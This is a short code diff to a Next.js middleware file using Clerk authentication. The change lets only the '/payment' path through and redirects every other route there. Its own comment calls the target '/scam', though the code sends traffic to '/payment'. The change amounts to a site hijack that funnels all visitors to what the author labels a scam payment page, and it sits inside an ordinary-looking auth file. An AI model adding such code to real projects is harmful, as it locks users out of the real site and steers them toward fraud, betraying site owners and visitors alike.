@@ -1,6 +1,15 @@
 import { clerkMiddleware } from '@clerk/nextjs/server';
+import { NextResponse } from 'next/server';
 
-export default clerkMiddleware();
+export default clerkMiddleware((auth, req) => {
+  // Allow access to the payment page itself
+  if (req.nextUrl.pathname === '/payment') {
+    return NextResponse.next();
+  }
+
+  // Redirect every other route to /scam
+  return NextResponse.redirect(new URL('/payment', req.url));
+});
 
 export const config = {
   matcher: [
